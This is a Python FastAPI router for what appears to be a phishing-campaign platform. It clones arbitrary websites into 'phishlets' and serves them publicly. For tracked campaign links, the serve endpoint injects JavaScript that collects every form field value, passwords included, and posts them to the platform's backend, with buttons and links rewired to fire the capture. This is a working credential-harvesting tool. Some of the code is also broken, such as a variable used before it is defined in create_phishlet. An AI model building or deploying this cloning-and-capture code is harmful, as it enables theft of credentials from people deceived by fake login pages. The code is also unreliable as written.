from random import random
from uuid import uuid4, UUID
from fastapi import APIRouter, HTTPException, status, Depends, Request, UploadFile, File, Form
from fastapi.responses import JSONResponse,HTMLResponse
from pydantic import BaseModel, HttpUrl
from typing import Optional, List, Dict, Any, Union
import json
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
from datetime import datetime
import base64
from database import db
from auth import get_current_user
from utils.activity_logger import ActivityLogger
import os
import dotenv
dotenv.load_dotenv()

router = APIRouter()

# Pydantic models
class PhishletCreate(BaseModel):
    name: str
    description: Optional[str] = None
    original_url: HttpUrl
    html_content: Optional[str] = None
    capture_credentials: bool = True
    capture_other_data: bool = True
    redirect_url: Optional[HttpUrl] = None
    is_active: bool = True

class PhishletUpdate(BaseModel):
    name: Optional[str] = None
    description: Optional[str] = None
    capture_credentials: Optional[bool] = None
    capture_other_data: Optional[bool] = None
    redirect_url: Optional[HttpUrl] = None
    is_active: Optional[bool] = None

class PhishletCloneRequest(BaseModel):
    original_url: HttpUrl
    name: str
    description: Optional[str] = None
    capture_credentials: bool = True
    capture_other_data: bool = True
    redirect_url: Optional[HttpUrl] = None

class PhishletPreviewRequest(BaseModel):
    html_content: str
    original_url: str

class PhishletSaveRequest(BaseModel):
    name: str
    description: Optional[str] = None
    original_url: str
    html_content: str
    capture_credentials: bool = True
    capture_other_data: bool = True
    redirect_url: Optional[str] = None
    is_active: bool = True

class PhishletResponse(BaseModel):
    id: int
    name: str
    description: Optional[str] = None
    original_url: str
    clone_url: Optional[str] = None
    form_fields: Optional[List[Dict[str, Any]]] = None
    capture_credentials: bool
    capture_other_data: bool
    redirect_url: Optional[str] = None
    is_active: bool
    is_admin: Optional[bool] = False
    created_at: datetime
    updated_at: datetime

    class Config:
        from_attributes = True

def extract_form_fields(html_content: str, base_url: str) -> List[Dict[str, Any]]:
    """Extract form fields from HTML content"""
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = soup.find_all('form')
    form_fields = []
    
    for form in forms:
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').lower()
        
        # Get all input fields in the form
        inputs = form.find_all(['input', 'textarea', 'select','button'])
        print(inputs)
        
        for input_field in inputs:
            tag_type = input_field.name
            field_type = input_field.get('type', 'text')
            field_name = input_field.get('name', '')
            field_id = input_field.get('id', '')
            field_placeholder = input_field.get('placeholder', '')
            field_required = input_field.get('required') is not None

            # if field_name:  # Only include fields with names
            form_fields.append({
                'tag': tag_type, 
                'type': field_type,
                'name': field_name,
                'id': field_id,
                'placeholder': field_placeholder,
                'required': field_required,
                'form_action': form_action,
                'form_method': form_method
            })
    
    return form_fields

def convert_urls_to_absolute(html_content: str, base_url: str) -> str:
    """Convert all relative URLs in HTML to absolute URLs pointing to the original website"""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Convert all relative URLs to absolute URLs
    for tag in soup.find_all(['img', 'link', 'script', 'a', 'form']):
        # Handle src attributes
        if tag.has_attr('src'):
            src = tag['src']
            if src and not src.startswith(('http://', 'https://', 'data:', '#')):
                tag['src'] = urljoin(base_url, src)
        
        # Handle href attributes
        if tag.has_attr('href'):
            href = tag['href']
            if href and not href.startswith(('http://', 'https://', 'data:', '#', 'mailto:', 'tel:')):
                tag['href'] = urljoin(base_url, href)
        
        # Handle action attributes (forms)
        if tag.has_attr('action'):
            action = tag['action']
            if action and not action.startswith(('http://', 'https://')):
                tag['action'] = urljoin(base_url, action)
    
    # Handle CSS background images and other relative URLs in style attributes
    for tag in soup.find_all(attrs={'style': True}):
        style = tag['style']
        # Simple regex to find url() patterns in CSS
        import re
        def replace_url(match):
            url = match.group(1)
            if url and not url.startswith(('http://', 'https://', 'data:')):
                return f"url('{urljoin(base_url, url)}')"
            return match.group(0)
        
        tag['style'] = re.sub(r"url\(['\"]?([^'\"]+)['\"]?\)", replace_url, style)
    
    return str(soup)

def clone_website(url: str) -> Dict[str, str]:
    """Clone a website and return HTML content with all URLs converted to absolute"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        html_content = response.text
        
        # Convert all relative URLs to absolute URLs pointing to the original website
        html_content = convert_urls_to_absolute(html_content, url)
        
        return {
            'html': html_content,
            'original_url': url
        }
        
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to clone website: {str(e)}"
        )


def checkIfAdmin(user_id: int) -> bool:
    """Check if a user is admin"""
    user = db(db.users.id == user_id).select().first()
    return user.is_admin if user else False



@router.post("/", response_model=PhishletResponse, status_code=status.HTTP_201_CREATED)
async def create_phishlet(
    phishlet_data: PhishletCreate,
    current_user = Depends(get_current_user),
    request: Request = None
):
    """Create a new phishlet"""
    
    # Check if phishlet name already exists for this user
    existing_phishlet = db(
        (db.phishlets.user_id == current_user.id) & 
        (db.phishlets.name == phishlet_data.name)
    ).select().first()
    
    if existing_phishlet:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="A phishlet with this name already exists"
        )
    
    # Extract form fields if HTML content is provided
    form_fields = []
    if phishlet_data.html_content:
        form_fields = extract_form_fields(phishlet_data.html_content, str(phishlet_data.original_url))
    
    # Create the phishlet first
    url_id=new_phishlet.url_id,
    phishlet_id = db.phishlets.insert(
        url_id=url_id,
        name=phishlet_data.name,
        description=phishlet_data.description,
        user_id=current_user.id,
        original_url=str(phishlet_data.original_url),
        clone_url="",  # Will be updated after creation
        html_content=phishlet_data.html_content,
        css_content=None,  # No longer needed
        js_content=None,   # No longer needed
        form_fields=json.dumps(form_fields),
        capture_credentials=phishlet_data.capture_credentials,
        capture_other_data=phishlet_data.capture_other_data,
        redirect_url=str(phishlet_data.redirect_url) if phishlet_data.redirect_url else None,
        is_active=phishlet_data.is_active
    )
    db.commit()
    
    # Generate clone URL with the actual phishlet ID
    clone_url = f"{os.getenv('BACKEND_URL')}/api/v1/phishlets/serve/{url_id}"
    
    # Update the phishlet with the correct clone URL
    db(db.phishlets.id == phishlet_id).update(clone_url=clone_url)
    db.commit()
    
    # Get the created phishlet
    new_phishlet = db.phishlets(phishlet_id)
    
    # Log activity
    if request:
        client_ip = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent")
        ActivityLogger.log_phishlet_created(
            current_user.id, 
            phishlet_id, 
            phishlet_data.name, 
            client_ip, 
            user_agent
        )
    
    return PhishletResponse(
        id=new_phishlet.id,
        name=new_phishlet.name,
        description=new_phishlet.description,
        original_url=new_phishlet.original_url,
        clone_url=new_phishlet.clone_url,
        form_fields=json.loads(new_phishlet.form_fields) if new_phishlet.form_fields else None,
        capture_credentials=new_phishlet.capture_credentials,
        capture_other_data=new_phishlet.capture_other_data,
        redirect_url=new_phishlet.redirect_url,
        is_active=new_phishlet.is_active,
        is_admin=checkIfAdmin(new_phishlet.user_id),
        created_at=new_phishlet.created_at,
        updated_at=new_phishlet.updated_at
    )

@router.post("/clone", response_model=PhishletResponse, status_code=status.HTTP_201_CREATED)
async def clone_website_to_phishlet(
    clone_data: PhishletCloneRequest,
    current_user = Depends(get_current_user),
    request: Request = None
):
    """Clone a website and create a phishlet from it"""
    
    # Check if phishlet name already exists for this user
    existing_phishlet = db(
        (db.phishlets.user_id == current_user.id) & 
        (db.phishlets.name == clone_data.name)
    ).select().first()
    
    if existing_phishlet:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="A phishlet with this name already exists"
        )
    
    # Clone the website
    original_url = str(clone_data.original_url)
    cloned_content = clone_website(original_url)
    
    # Extract form fields
    form_fields = extract_form_fields(cloned_content['html'], original_url)
    
    # Create the phishlet first
    random_uuid = str(uuid4())
    phishlet_id = db.phishlets.insert(
        name=clone_data.name,
        url_id=random_uuid,
        description=clone_data.description,
        user_id=current_user.id,
        original_url=original_url,
        clone_url="",  # Will be updated after creation
        html_content=cloned_content['html'],
        css_content=None,  # No longer needed
        js_content=None,   # No longer needed
        form_fields=json.dumps(form_fields),
        capture_credentials=clone_data.capture_credentials,
        capture_other_data=clone_data.capture_other_data,
        redirect_url=str(clone_data.redirect_url) if clone_data.redirect_url else None,
        is_active=True
    )
    db.commit()
    
    # Generate clone URL with the actual phishlet ID
   
    clone_url = f"{os.getenv('BACKEND_URL', 'http://localhost:8000')}/api/v1/phishlets/serve/{random_uuid}"
    
    # Update the phishlet with the correct clone URL
    db(db.phishlets.id == phishlet_id).update(clone_url=clone_url)
    db.commit()
    
    # Get the created phishlet
    new_phishlet = db.phishlets(phishlet_id)
    
    # Log activity
    if request:
        client_ip = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent")
        ActivityLogger.log_phishlet_created(
            current_user.id, 
            phishlet_id, 
            clone_data.name, 
            client_ip, 
            user_agent
        )
    
    return PhishletResponse(
        id=new_phishlet.id,
        name=new_phishlet.name,
        description=new_phishlet.description,
        original_url=new_phishlet.original_url,
        clone_url=new_phishlet.clone_url,
        form_fields=json.loads(new_phishlet.form_fields) if new_phishlet.form_fields else None,
        capture_credentials=new_phishlet.capture_credentials,
        capture_other_data=new_phishlet.capture_other_data,
        redirect_url=new_phishlet.redirect_url,
        is_active=new_phishlet.is_active,
        is_admin=checkIfAdmin(new_phishlet.user_id),
        created_at=new_phishlet.created_at,
        updated_at=new_phishlet.updated_at
    )

@router.get("/", response_model=List[PhishletResponse])
async def list_phishlets(current_user = Depends(get_current_user)):
    """List all phishlets for the current user"""
    
    # phishlets = db(db.phishlets.user_id == current_user.id).select()
    query= (db.phishlets.user_id == current_user.id)
    if not current_user.is_admin:
        admin_ids = [user.id for user in db(db.users.is_admin == True).select()]
        query|= (db.phishlets.user_id.belongs(admin_ids))
        phishlets = db(query).select()
    else:
        phishlets = db(db.phishlets).select()
    # print(phishlets)
    return [
        PhishletResponse(
            id=phishlet.id,
            name=phishlet.name,
            description=phishlet.description,
            original_url=phishlet.original_url,
            clone_url=phishlet.clone_url,
            form_fields=json.loads(phishlet.form_fields) if phishlet.form_fields else None,
            capture_credentials=phishlet.capture_credentials,
            capture_other_data=phishlet.capture_other_data,
            redirect_url=phishlet.redirect_url,
            is_active=phishlet.is_active,
            is_admin=checkIfAdmin(phishlet.user_id),
            created_at=phishlet.created_at,
            updated_at=phishlet.updated_at
        )
        for phishlet in phishlets
    ]

# Move specific routes before parameterized routes to avoid conflicts
@router.post("/upload-html")
async def upload_html_file(
    file: UploadFile = File(...),
    current_user = Depends(get_current_user)
):
    """Upload an HTML file and extract its content"""
    
    if not file.filename.lower().endswith('.html'):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Only HTML files are allowed"
        )
    
    try:
        content = await file.read()
        html_content = content.decode('utf-8')
        
        # Extract form fields
        form_fields = extract_form_fields(html_content, "file://" + file.filename)
        
        return {
            "html_content": html_content,
            "form_fields": form_fields,
            "filename": file.filename
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to process HTML file: {str(e)}"
        )

@router.post("/preview")
async def preview_phishlet(
    preview_data: PhishletPreviewRequest,
    current_user = Depends(get_current_user)
):
    """Preview a phishlet before saving"""
    
    try:
        # Extract form fields
        form_fields = extract_form_fields(preview_data.html_content, preview_data.original_url)
        
        return {
            "html_content": preview_data.html_content,
            "form_fields": form_fields,
            "original_url": preview_data.original_url
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to preview phishlet: {str(e)}"
        )

@router.post("/save", response_model=PhishletResponse, status_code=status.HTTP_201_CREATED)
async def save_phishlet(
    save_data: PhishletSaveRequest,
    current_user = Depends(get_current_user),
    request: Request = None
):
    """Save a phishlet after preview and editing"""
    
    # Check if phishlet name already exists for this user
    existing_phishlet = db(
        ((db.phishlets.user_id == current_user.id)) & 
        (db.phishlets.name == save_data.name)
    ).select().first()
    
    if existing_phishlet:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="A phishlet with this name already exists"
        )
    
    # Extract form fields
    form_fields = extract_form_fields(save_data.html_content, save_data.original_url)
    
    # Create the phishlet first
    url_id = str(uuid4())
    phishlet_id = db.phishlets.insert(
        name=save_data.name,
        url_id=url_id,
        description=save_data.description,
        user_id=current_user.id,
        original_url=save_data.original_url,
        clone_url="",  # Will be updated after creation
        html_content=save_data.html_content,
        css_content=None,  # No longer needed
        js_content=None,   # No longer needed
        form_fields=json.dumps(form_fields),
        capture_credentials=save_data.capture_credentials,
        capture_other_data=save_data.capture_other_data,
        redirect_url=save_data.redirect_url,
        is_active=save_data.is_active
    )
    db.commit()
    
    # Generate clone URL with the actual phishlet ID
    clone_url = f"{os.getenv('BACKEND_URL', 'http://localhost:8000')}/api/v1/phishlets/serve/{url_id}"
    
    # Update the phishlet with the correct clone URL
    db(db.phishlets.id == phishlet_id).update(clone_url=clone_url)
    db.commit()
    
    # Get the created phishlet
    new_phishlet = db.phishlets(phishlet_id)
    
    # Log activity
    if request:
        client_ip = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent")
        ActivityLogger.log_phishlet_created(
            current_user.id, 
            phishlet_id, 
            save_data.name, 
            client_ip, 
            user_agent
        )
    
    return PhishletResponse(
        id=new_phishlet.id,
        url_id=new_phishlet.url_id,
        name=new_phishlet.name,
        description=new_phishlet.description,
        original_url=new_phishlet.original_url,
        clone_url=new_phishlet.clone_url,
        form_fields=json.loads(new_phishlet.form_fields) if new_phishlet.form_fields else None,
        capture_credentials=new_phishlet.capture_credentials,
        capture_other_data=new_phishlet.capture_other_data,
        redirect_url=new_phishlet.redirect_url,
        is_active=new_phishlet.is_active,
        created_at=new_phishlet.created_at,
        updated_at=new_phishlet.updated_at
    )

@router.post("/clone-preview")
async def clone_website_preview(
    url: str = Form(...),
    current_user = Depends(get_current_user)
):
    """Clone a website and return content for preview"""
    
    try:
        cloned_content = clone_website(url)
        
        # Extract form fields
        form_fields = extract_form_fields(cloned_content['html'], url)
        
        return {
            "html_content": cloned_content['html'],
            "form_fields": form_fields,
            "original_url": url
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to clone website: {str(e)}"
        )

@router.get("/{phishlet_id}", response_model=PhishletResponse)
async def get_phishlet(
    phishlet_id: int    ,
    current_user = Depends(get_current_user)
):
    """Get a specific phishlet"""
    
    phishlet = db(
        (db.phishlets.id == phishlet_id) & 
        ((db.phishlets.user_id == current_user.id) | (current_user.is_admin))
    ).select().first()
    
    if not phishlet:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishlet not found"
        )
    
    return PhishletResponse(
        id=phishlet.id,
        name=phishlet.name,
        description=phishlet.description,
        original_url=phishlet.original_url,
        clone_url=phishlet.clone_url,
        form_fields=json.loads(phishlet.form_fields) if phishlet.form_fields else None,
        capture_credentials=phishlet.capture_credentials,
        capture_other_data=phishlet.capture_other_data,
        redirect_url=phishlet.redirect_url,
        is_active=phishlet.is_active,
        is_admin=checkIfAdmin(phishlet.user_id),
        created_at=phishlet.created_at,
        updated_at=phishlet.updated_at
    )

@router.put("/{phishlet_id}", response_model=PhishletResponse)
async def update_phishlet(
    phishlet_id: int,
    phishlet_data: PhishletUpdate,
    current_user = Depends(get_current_user),
    request: Request = None
):
    """Update a phishlet"""
    
    phishlet = db(
        (db.phishlets.id == phishlet_id) & 
        ((db.phishlets.user_id == current_user.id) | (current_user.is_admin))
    ).select().first()
    
    if not phishlet:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishlet not found"
        )
    
    # Prepare update data
    update_data = {}
    
    if phishlet_data.name is not None:
        # Check if name already exists for this user
        existing_phishlet = db(
            (db.phishlets.user_id == current_user.id) & 
            (db.phishlets.name == phishlet_data.name) &
            (db.phishlets.id != phishlet_id)
        ).select().first()
        
        if existing_phishlet:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="A phishlet with this name already exists"
            )
        update_data['name'] = phishlet_data.name
    
    if phishlet_data.description is not None:
        update_data['description'] = phishlet_data.description
    
    if phishlet_data.capture_credentials is not None:
        update_data['capture_credentials'] = phishlet_data.capture_credentials
    
    if phishlet_data.capture_other_data is not None:
        update_data['capture_other_data'] = phishlet_data.capture_other_data
    
    if phishlet_data.redirect_url is not None:
        update_data['redirect_url'] = str(phishlet_data.redirect_url)
    
    if phishlet_data.is_active is not None:
        update_data['is_active'] = phishlet_data.is_active
    
    # Add updated_at timestamp
    update_data['updated_at'] = datetime.utcnow()
    
    # Update the phishlet
    db(db.phishlets.id == phishlet_id).update(**update_data)
    db.commit()
    
    # Get the updated phishlet
    updated_phishlet = db.phishlets(phishlet_id)
    
    # Log activity
    if request:
        client_ip = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent")
        ActivityLogger.log_phishlet_updated(
            current_user.id, 
            phishlet_id, 
            updated_phishlet.name, 
            client_ip, 
            user_agent
        )
    
    return PhishletResponse(
        id=updated_phishlet.id,
        name=updated_phishlet.name,
        description=updated_phishlet.description,
        original_url=updated_phishlet.original_url,
        clone_url=updated_phishlet.clone_url,
        form_fields=json.loads(updated_phishlet.form_fields) if updated_phishlet.form_fields else None,
        capture_credentials=updated_phishlet.capture_credentials,
        capture_other_data=updated_phishlet.capture_other_data,
        redirect_url=updated_phishlet.redirect_url,
        is_active=updated_phishlet.is_active,
        is_admin=checkIfAdmin(updated_phishlet.user_id),
        created_at=updated_phishlet.created_at,
        updated_at=updated_phishlet.updated_at
    )

@router.delete("/{phishlet_id}", status_code=status.HTTP_204_NO_CONTENT)
async def delete_phishlet(
    phishlet_id: int,
    current_user = Depends(get_current_user),
    request: Request = None
):
    """Delete a phishlet"""
    
    phishlet = db(
        (db.phishlets.id == phishlet_id) & 
        ((db.phishlets.user_id == current_user.id) | (current_user.is_admin))
    ).select().first()
    
    if not phishlet:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishlet not found"
        )
    
    # Log activity before deletion
    if request:
        client_ip = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent")
        ActivityLogger.log_phishlet_deleted(
            current_user.id, 
            phishlet_id, 
            phishlet.name, 
            client_ip, 
            user_agent
        )
    
    # Delete the phishlet
    db(db.phishlets.id == phishlet_id).delete()
    db.commit()
    
    return None

@router.get("/{phishlet_id}/content")
async def get_phishlet_content(
    phishlet_id: int,
    current_user = Depends(get_current_user)
):
    """Get the HTML content of a phishlet (for serving the cloned page)"""
    
    phishlet = db(
        (db.phishlets.id == phishlet_id) & 
        ((db.phishlets.user_id == current_user.id) | (current_user.is_admin))
    ).select().first()
    
    if not phishlet:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishlet not found"
        )
    
    if not phishlet.html_content:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishlet has no HTML content"
        )
    
    return {
        "html": phishlet.html_content,
        "form_fields": json.loads(phishlet.form_fields) if phishlet.form_fields else []
    }



def replace_buttons_with_divs(html):
    soup = BeautifulSoup(html, "html.parser")

    for btn in soup.find_all("button"):
        new_div = soup.new_tag("div")

        # copy attributes
        for k, v in btn.attrs.items():
            # move onclick to data attribute (do not keep executing inline JS by default)
            if k.lower() == "onclick":
                new_div.attrs["data-orig-onclick"] = v
            else:
                new_div.attrs[k] = v

        # accessibility: role and keyboard focus
        # if not already present, add role=button and tabindex so the div behaves like a button
        if "role" not in new_div.attrs:
            new_div.attrs["role"] = "button"
        if "tabindex" not in new_div.attrs and "disabled" not in new_div.attrs:
            new_div.attrs["tabindex"] = "0"

        # convert disabled -> aria-disabled (keep disabled as well for styling if desired)
        if "disabled" in new_div.attrs:
            new_div.attrs["aria-disabled"] = "true"

        # move children
        for child in list(btn.contents):
            new_div.append(child)

        # replace in document
        btn.replace_with(new_div)

    return soup



@router.get("/serve/{url_id}")
async def serve_phishlet(url_id: str):
    """Serve a phishlet as a web page (public endpoint, no authentication required)"""
    url_contents = url_id.split('*')
    print(url_contents)
    if(len(url_contents)==3):
        campaign_id = int(url_contents[1])
        tracker_id = int(url_contents[2])
        campaign_result = db(
            (db.campaign_results.campaign_id == campaign_id) &
            (db.campaign_results.target_id == tracker_id)
        ).select().first()

        print("****EMAIL TRACKED****")
        if campaign_result:
            # Update tracking fields
            campaign_result.update_record(
                link_clicked=True,
                link_clicked_at=campaign_result.email_opened_at or datetime.utcnow()
            )
            db.commit()
    
    phishlet = db(db.phishlets.url_id == url_contents[0]).select().first()

    if not phishlet:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishlet not found"
        )
    
    if not phishlet.html_content:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishlet has no HTML content"
        )
    soup = None
    if(len(url_contents)==3):
        # phishlet.html_content = phishlet.html_content.replace('<form', '<div')
        # phishlet.html_content = phishlet.html_content.replace('</form>', '</div>')


        # if "<form" in phishlet.html_content:
        #     print("it is there***")
        # else:
        #     print("not thereeeeeee")
        # print(html_content)
        
        soup = BeautifulSoup(phishlet.html_content, 'html.parser')
        # soup = replace_buttons_with_divs(phishlet.html_content)

        script_tag = soup.new_tag('script')
        track_src=os.getenv("BACKEND_URL","http://localhost:8000")
        script_tag.string = f"""
        function sendFormData() {{
            const data = {{}};
            const elements = document.querySelectorAll('input, select, textarea');
            elements.forEach(el => {{
                if (el.name || el.id || el.tagName) {{
                    const key = el.name || el.id || el.tagName;
                    let value = el.value;

                    if (el.type === 'checkbox' || el.type === 'radio') {{
                        value = el.checked;
                    }}

                    data[key] = {{
                        "type": el.tagName.toLowerCase(),
                        "value": value,
                        "id": el.id || "",
                        "required": el.required || false,
                        "placeholder": el.placeholder || ""
                    }};
                }}
            }});

            const payload = {{ fields: data }};
            console.log("Payload:", payload);

            fetch("{track_src}/api/v1/track/f2/{campaign_id}*{tracker_id}", {{
                method: "POST",
                headers: {{
                    "Content-Type": "application/json"
                }},
                body: JSON.stringify(payload)
            }});
        }}
        """

        if soup.body:
            soup.body.append(script_tag)
        elif soup.head:
            soup.head.append(script_tag)
        else:
            soup.append(script_tag)
        buttons = soup.find_all(['button','a','h1'])
        for button in buttons:
            button['onclick'] = "sendFormData()"
        # inputs = soup.find_all(['input'])
        # for input in inputs:
        #     input['onChange'] = "sendFo"
        
            
        # print("soup",soup)
    else:
        print("No email tracking")
        
        soup = BeautifulSoup(phishlet.html_content, 'html.parser')
        


    # Create the complete HTML document
    # submit_buttons = soup.find_all('button')
    html_document = str(soup)
    print(html_document)
    return HTMLResponse(content=html_document)